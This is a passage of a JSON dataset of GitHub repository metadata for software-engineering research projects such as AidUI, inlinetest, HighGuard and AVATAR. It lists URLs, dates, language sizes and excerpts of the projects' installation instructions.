                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 87228
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Standard ML",
                    "name": "Standard ML",
                    "type": "Programming_language",
                    "size": 49559
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3568
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 123
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "273": {
        "filename": "singhalshubh_SAT_Parallelism_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/singhalshubh/Hardware-Acceleration-of-Minisat--AccEx",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-06-13T00:48:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-12-24T13:15:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 79640
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1235
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "274": {
        "filename": "SageSELab_AidUI_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SageSELab/AidUI",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "For installation instructions, please go to our GitHub repository: https://github.com/SageSELab/AidUI\n\nThe README file in the repository provides the directory structure of the source code of AidUI as well as the instructions to set it up.\n\nWe provide installation instructions for Ubuntu 20.04.2 LTS\n\t\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/SageSELab/AidUI/master/INSTALL.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To setup and run AidUI, following steps need to be done. \n1. #### Install Docker\nTo install Docker, please follow the instructions at this [link](https://www.docker.com/). \n2. #### Download AidUI docker image by executing the following command:\n```bash\ndocker pull smhasanmansur/aidui-img\n``` \n3. #### Run the container by executing the following command:\n```bash\ndocker run -it smhasanmansur/aidui-img\n``` \n4. #### Use following command to move to the root directory of AidUI:\n```bash\ncd AidUI/\n``` \n5. #### Execute the following command to run AidUI\n```bash\n./run_dp_detection.sh\n``` \n### Install and Run AidUI without Docker (Ubuntu Only) \n**NOTE**: ***Our provided instructions for installing AidUI are currently only applicable to Ubuntu 20.04.2 LTS (although other recent versions of Ubuntu should be fine), due to the specific Anaconda packages required. As such, these instructions will likely not work on Windows or mcOS.***  \n1. #### Clone AidUI\nClone this repository by using the ```git clone``` command. If git is not already installed, please follow the installation instructions provided [here](https://git-scm.com/downloads). \n2. #### Install Anaconda\nTo install Anaconda, please follow the instructions at this [link](https://www.anaconda.com/). \n3. #### Setup the conda environments\nInstalled Anaconda comes with a default conda environment _\"base\"_. We can check the available environments using the following command:\n```bash\nconda info --envs\n```\nFor AidUI, two conda environments need to be setup: _**\"dl_dp_obj_det_env\"**_ and _**\"dp_uied3\"**_ \nWe provide the specification files to build identical conda environments as ours:\n- _**\"dl_dp_obj_det_env\"**_: [env_specification_files/dl_dp_obj_det_env.txt](env_specification_files/dl_dp_obj_det_env.txt)\n- _**\"dp_uied3\"**_: [env_specification_files/dp_uied3.txt](env_specification_files/dp_uied3.txt) \n",
                    "original_header": "Setup AidUI Using Docker (Recommended)"
                },
                "confidence": 0.998951284574758,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SageSELab/AidUI/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Following commands can be used to create the required environments from the root of the cloned repository:\n```bash\nconda create --name dl_dp_obj_det_env --file env_specification_files/dl_dp_obj_det_env.txt\n```\nBASH11* \n",
                    "original_header": "Install Docker"
                },
                "confidence": 0.9999988364107486,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SageSELab/AidUI/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "5. #### Run AidUI\n- Move to the root directory of AidUI \n",
                    "original_header": "Setup AidUI Using Docker (Recommended)"
                },
                "confidence": 0.9457216330208236,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SageSELab/AidUI/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Execute the following command to run AidUI\n```bash\n./run_dp_detection.sh\n```\n- You should see the following prompt:\nBASH6*\n- Type y and press ENTER \n",
                    "original_header": "Install Docker"
                },
                "confidence": 0.9999998442848984,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SageSELab/AidUI/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-23T15:06:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T08:09:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 387330
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 317091
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2624
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 589
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "275": {
        "filename": "HUB-SE_PAP_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hub-se/PAP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-01-30T08:26:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-20T09:50:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 83518
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "276": {
        "filename": "EngineeringSoftware_inlinetest_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EngineeringSoftware/inlinetest",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation Guide\n\nI-Test currently supports two programming languages, Python and Java.\n\nWe provide two options to install the required software for running\nI-Test and our scripts:\n1. use [docker][sec-docker]\n2. install to [local environment][sec-local]. \n\n## Use Docker\n[sec-docker]: #use-docker\n\nWe provide a Docker image pre-installed with all required software\n(conda, sdkman, texlive) and is ready to be used to replicate all\nexperiments in this artifact.  Please ensure at least 20GB of disk\nspace to download the image and run experiments.\n\nIf you haven't, please install Docker Engine following the\ninstructions here: [Install Docker Engine][docker-webpage].\n\nThen, you can download our image by running\n```\ndocker pull pipiyuyu/inlinetests:latest\n```\n\nYou can start the container by running\n```\ndocker run -it -m 4g pipiyuyu/inlinetests /bin/bash\n```\n\nThis will drop you into the docker image's terminal at\n`/home/itdocker`.  All content of this repo (on the latest release\nversion) is located there.  \n\nTo run something using sudo, the password is `itdocker`\n\n\n## Install to Local Environment\n[sec-local]: #install-to-local-environment\n\nWe utilize the package management systems\n([conda][conda-webpage] for Python and [sdkman][sdkman-webpage] for\nJava) to install the necessary dependencies for I-Test itself, for our\nexperiment scripts, and for running the unit tests of other\nopen-source projects in our integrated experiments.\n\nThis document will guide you through the following steps (with some\nusage examples to verify if the installation is successful):\n- install the package management systems\n- install the I-Test framework\n- install the environment for running our experiment scripts\n\n\n### System Requirements\n\nThe minimum requirements for replicating our experiments are:\n- a Linux operating system (MacOS not guaranteed to work)\n- at least 10GB of free disk space\n\nNote that I-Test framework itself is not limited to Linux; we have\ntested the I-Test framework on a MacOS machine (with MacOS 10.15.7).\nHowever, a part of our experiment scripts uses Bash and relies on\nLinux-specific grammars.\n\nFor your reference, we used the machine with the following specs to\nrun experiments:\n- Intel Core i7-11700K @ 3.60GHz (8 cores, 16 threads) CPU\n- 64 GB RAM\n- Ubuntu 20.04 operating system\n\n\n### Installing Package Management Systems\n\nThe two package management systems we use, [conda][conda-webpage] and\n[sdkman][sdkman-webpage], can both be installed in user mode (i.e.,\ndoes not require sudo).  To install each of them, you will need to\nexecute some commands AND configure your `.bashrc` appropriately, and\nthen restart the terminal for the changes to take effect.  If you\nhappen to have existing installations of (a recent version of) either\npackage management system, you do not need to install it again.\n\n*Note*: you don't have to install Python and Java on your own, as our\nscripts will automatically install the correct version of them using\nconda and sdkman.\n\n#### conda for Python\n\n1. Download the Miniconda installation script from\n   [here](https://docs.conda.io/en/latest/miniconda.html#latest-miniconda-installer-links);\n   pick the correct link according to your CPU architecture (usually\n   \"Miniconda3 Linux 64-bit\", but for ARM should be \"Miniconda3\n   Linux-aarch64 64-bit\").\n   For example:\n```\nwget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh\n```\n\n(Installing Anaconda is also fine, which is bundled with some\nlibraries that we don't need.)\n\n2. Execute the downloaded script, and follow the prompts on the\n   terminal to install conda at the desired location. For example:\n\n```\nbash Miniconda3-latest-Linux-x86_64.sh\n```\n\n3. If not already done at the end of the last step, run `conda init` which automatically changes your `.bashrc` file to use conda.\n\n4. Restart your terminal. By executing `conda --version`, you should be able to see the version of conda you just installed.\n\n\n#### sdkman for Java\n\n1. Execute the following command, and follow the prompts on the\n   terminal to install sdkman.\n\n```\ncurl -s \"https://get.sdkman.io\" | bash\n```\n\n2. Restart your terminal. By executing `sdk version`, you should be able to see the version of sdkman you just installed.\n\n\n### Installing the I-Test Framework\n\n#### Python 3.6+\n\n1. Change directory to \"python\". Assuming you were at the root of this\n   repository: `cd python`\n\n2. Execute `./prepare-conda-env.sh`\n\n3. Execute `conda activate inline-dev`\n\n4. You should be able to see \"(inline-dev) \" as the prefix of the\n   prompt in your terminal. Then, to further check if installation is\n   successful, you can run the tests for the I-Test framework in\n   Python: `pytest`\n\n* Trouble shooting: if you get error \"CondaEnvironmentError: cannot\n  remove current environment. deactivate and run conda remove again\",\n  please run `conda deactivate` to exit the inline-dev environment,\n  then try again.\n\n#### Java 8\n\n1. Change directory to \"java\". Assuming you were at the root of this\n   repository: `cd java`\n\n2. Execute `./install.sh`\n\n3. During the installation in the previous step, we actually already\n   run the tests for the I-Test framework in Java.  You can also run\n   these tests again to double-check if the installation is\n   successful: `sdk use java 8.0.302-open; sdk use maven 3.8.3; mvn test`\n\n\n### Installing the Environment for Experiment Scripts\n\n1. Change directory to \"research\". Assuming you were at the root of\n   this repository: `cd research`\n\n2. Execute `./prepare-conda-env.sh`\n\n3. Execute `conda activate inline-research`\n\n4. You should be able to see \"(inline-dev) \" as the prefix of the\n   prompt in your terminal. Then, to further check if installation is\n   successful, you can run the script for running the inline tests in\n   the 50 Python example files and 50 Java example files:\n\n```\npython -m research.exp_standalone run --language=python --requests_file=../data/exp/standalone/python.yaml --run_dir=../data/examples/python --out_dir=/tmp/inlinetest-smoke/python --force=True\npython -m research.exp_standalone run --language=java --requests_file=../data/exp/standalone/java.yaml --run_dir=../data/examples/java --out_dir=/tmp/inlinetest-smoke/java --force=True\n```\n\nFor both of the previous commands, you should see a progress bar that ends at \"running: 100% ... 50/50 ...\", without warning or error messages.\n\n\n* Trouble shooting: if you get error \"CondaEnvironmentError: cannot\n  remove current environment. deactivate and run conda remove again\",\n  please run `conda deactivate` to exit the inline-dev environment,\n  then try again.\n\n\n[docker-webpage]: https://docs.docker.com/engine/install/\n[conda-webpage]: https://docs.conda.io/en/latest/\n[sdkman-webpage]: https://sdkman.io/\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/inlinetest/main/INSTALL.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-26T18:54:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-24T22:16:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 183661
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 156853
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 59447
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1660
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "277": {
        "filename": "logpai_awesome-log-analysis_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/awesome-log-analysis",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-03-09T07:00:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T06:01:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "278": {
        "filename": "dmrimawi_CAIS-DMA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dmrimawi/CAIS-DMA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-07-16T07:29:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T19:20:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 122267
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "279": {
        "filename": "mojtaba-eshghie_CLawK_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mojtaba-eshghie/HighGuard",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To manually install and run HighGuard, follow these steps:\n\n1. **Clone the repository:**\n\n   ```sh\n   git clone https://github.com/mojtaba-eshghie/HighGuard.git\n   cd HighGuard\n   ```\n\n2. **Install Node.js and npm:**\n\n   Ensure you have Node.js version 16.20.2 and npm version 8.19.4 installed. You can download and install Node.js from [Node.js official website](https://nodejs.org/).\n\n   Verify the installation:\n\n   ```sh\n   node --version\n   npm --version\n   ```\n\n3. **Install project dependencies:**\n\n   ```sh\n   npm install\n   ```\n\n4. **Install Foundry and Anvil:**\n\n   Follow the instructions to install Foundry from the [Foundry Book](https://book.getfoundry.sh/getting-started/installation).\n\n   ```sh\n   curl -L https://foundry.paradigm.xyz | bash\n   source ~/.bashrc\n   foundryup\n   ```\n\n5. **Run the CLI commands:**\n\n   You can now run the CLI commands as needed:\n\n   ```sh\n   pkill anvil; node CI/run.js -t synthesized -e separate -v -c micro-configs/config-synthesized-governance.yml\n   pkill anvil; node CI/run.js -t synthesized -e separate -v -c micro-configs/config-synthesized-escrow.yml\n   pkill anvil; node CI/run.js -t synthesized -e separate -v -c micro-configs/config-synthesized-multistageauction.yml\n   pkill anvil; node CI/run.js -t synthesized -e separate -v -c micro-configs/config-synthesized-prizedistribution.yml\n   pkill anvil; node CI/run.js -t synthesized -e separate -v -c micro-configs/config-synthesized-productorder.yml\n   pkill anvil; clear; node CI/run.js -t cross-chain -e unified\n   pkill anvil; clear; node CI/run.js -t cross-chain -e unified -l \"tests/Bridge.exploit1.js\"\n   pkill anvil; clear; node CI/run.js -t cross-chain -e unified -l \"tests/Bridge.exploit2.js\"\n   ```\n",
                    "type": "Text_excerpt",
                    "original_header": "Manual Installation",
                    "parent_header": [
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mojtaba-eshghie/CLawK/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n  <img src=\"https://github.com/mojtaba-eshghie/Clawk/assets/37236297/4ea40602-3791-478b-b121-28f4cd9555a5\" width=\"200\" alt=\"HighGuard Logo\">\n</p> \n",
                    "original_header": "HighGuard: Monitoring Smart Contracts Business Logic"
                },
                "confidence": 0.997656355175358,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mojtaba-eshghie/CLawK/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-24T19:33:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-19T08:01:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1999535
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 1208485
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1047271
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2755
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1721
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1517
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1271
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1139
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "280": {
        "filename": "wasiahmad_AVATAR_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wasiahmad/AVATAR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "There was a major bug in the AVATAR dataset as raised in this [issue](https://github.com/wasiahmad/AVATAR/issues/5). We observed that while crawling data from different sources, in many examples, new lines were missing. In Python data, we also observed missing indentation. As a result, programs were not parse-able. We re-crawled data and ensured every program we store is parse-able. The :bug: has been fixed, so you can continue using the dataset seamlessly. \n\n",
                    "type": "Text_excerpt",
                    "original_header": ":mega: Notice related to a dataset bug (:bug:) fix :point_left:",
                    "parent_header": [
                        "AVATAR"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/wasiahmad/AVATAR/main/README.md"
            },
            {
                "result": {
                    "value": "```\nconda create --name avatar_env python==3.8\nconda activate avatar_env\npip install -r requirements.txt\n\nmkdir -p third_party\ncd third_party\ngit clone https://github.com/tree-sitter/tree-sitter-java.git\ngit clone https://github.com/tree-sitter/tree-sitter-python.git\n\n# optional (for fp16 training)\ngit clone https://github.com/NVIDIA/apex\ncd apex\npip install -v --disable-pip-version-check --no-cache-dir --global-option=\"--cpp_ext\" --global-option=\"--cuda_ext\" .\ncd ..\n\n# building tree-sitter library\npython build.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "AVATAR"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/wasiahmad/AVATAR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The dataset details is provided [here](https://github.com/wasiahmad/AVATAR/blob/main/data/README.md#dataset). You can download the data by following:\n```\ncd data\nbash download.sh\n``` \n \nTo prepare the data, we perform the following steps. \nIf you want to perform the preparation of your own, run:\n```\ncd data\nbash prepare.sh\n```\n \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9926642258319743,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/wasiahmad/AVATAR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To train and evaluate a model, go to the corresponding model directory and execute the **run.sh** script.\n```\n# Seq2Seq+Attn, Transformer\ncd seq2seq\nbash rnn.sh GPU_ID SOURCE_LANG TARGET_LANG\nbash transformer.sh GPU_ID SOURCE_LANG TARGET_LANG\n\n# CodeBERT, GraphCoderBERT, CodeT5, PLBART\ncd [codebert|graphcodebert|codet5|plbart]\nbash run.sh GPU_ID SOURCE_LANG TARGET_LANG\n\n# CodeGPT, CodeGPT-adapted\ncd codegpt\nbash run.sh GPU_ID SOURCE_LANG TARGET_LANG [CodeGPT|adaptedCodeGPT]\n\n# Transcoder, Transcoder-DOBF, Transcoder-ST \ncd transcoder\nbash zero_shot.sh GPU_ID SOURCE_LANG TARGET_LANG [transcoder|transcoder-dobf|transcoder-st]\n```\n \n",
                    "original_header": "Training &amp; Evaluation"
                },
                "confidence": 0.9999999999998863,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/wasiahmad/AVATAR/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-08-23T20:45:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-07T09:13:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 936326
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 89285
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 5233
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "281": {
        "filename": "NTDXYG_ComFormer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NTDXYG/ComFormer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First you need train the tokenize:\n```\npython train_tokenizer.py\n```\n \nwhere you also need modify the dataset path, vocab_size and others, then the 'vocab.json' and 'merges.txt' will be saved in 'tokenize' folder. \nNext you can train, but also need modify the parameters in the 'train.py', such as your own train.csv, valid.csv and test.csv. If you train from scratch, make sure pretrained_model = None.\n```\nmodel = BartModel(pretrained_model=None,args=model_args, model_config='config.json', vocab_file=\"./tokenize\")\n```\n \nFinally run \n```\npython train.py\n```\n \n",
                    "original_header": "How To Train-From-Scratch"
                },
                "confidence": 0.9762629860814145,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NTDXYG/ComFormer/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This repo uses , , , , and . If the nlg-eval library installation encounters a dependency conflict, you can modify its project and then run setup.py. \n"
                },
                "confidence": 0.9999980441707036,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NTDXYG/ComFormer/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-09T02:28:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-18T10:55:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54586
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "282": {
        "filename": "OpsPAI_ADSketch_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OpsPAI/ADSketch",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-09T06:19:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-02T00:33:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 30462
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "283": {
        "filename": "huhanGitHub_iOS-App-database_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/huhanGitHub/iOS-App-database",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-07-16T06:32:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T14:32:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "284": {
        "filename": "dfava_grace_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dfava/grace",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In the happens-before set approach, a memory location keeps track of the most recent write onto that location, and of the most recent reads that accumulated after the write.  Technically, not all reads need to be recorded, only the most recent reads that are not ordered.  For example, if thread `t` reads from `z` and then reads again, the second read subsumes the first.  Similarly, a thread keeps track of the reads and writes to memory that it is \"aware of\".\n\nThe difference with vector-clocks is that we track individual accesses, which means that we consume more memory.  Vector-clock based race detectors have a worst-case memory consumption of `O(\u03c4)` per thread, where `\u03c4` is the number of entries in the vector, which is capped by the number of threads spawn during execution.  The per-thread memory consumption of happens-before sets is `O(\u03bd\u03c4)` where `\u03bd` is the number of shared variables in a program.\n\nVector clocks' memory efficiency, when compared to happens-before sets, come from VC's ability to succinctly capture the per-thread accesses that take place in between advances of a clock. A thread's clock is advanced when the thread releases a lock. All accesses made by a thread `t` in a given clock `c` are captured by the clock: if another thread `u` \"knows\" the value `c` of `t`'s clock, then `u` is in *happens-after* with all accesses made by `t`---that is, all accesses up to when `t`'s clock was advanced to `c + 1`. In contrast, the happens-before set representation is much more coarse. We keep track of individual accesses, as opposed to lumping them together into a clock number. This coarseness explains the extra factor of `\u03bd` in the worst-case analysis of the happens-before set solution. Although being a disadvantage in the worst case scenario, happens-before sets do provide some benefits.\n\nThe vector clocks associated with threads and locks grow monotonically. By growing monotonically we do not mean that time marches forward to increasing clock values. Instead, we mean that the number of clocks in a vector grows without provisions for the removal of entries. This growth can lead to the accumulation of \"stale\" information, where by stale we mean information that is not useful from the point of view of race detection. This growth stands in contrast to HB-set's approach to garbage collection. Stale information is purged from happens-before sets, which means they can shrink back to size zero after having grown in size.\n\n\nWe conjecture that an approach that purges stale information from VCs, similar to HB-set's notion of garbage collection, would be highly be beneficial.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Data-race detection based on happens-before sets",
                    "parent_header": [
                        "Grace"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dfava/grace/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-09T12:25:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-05T21:59:17Z",
                    "type": "Date"
                },
                "confidence": 1,
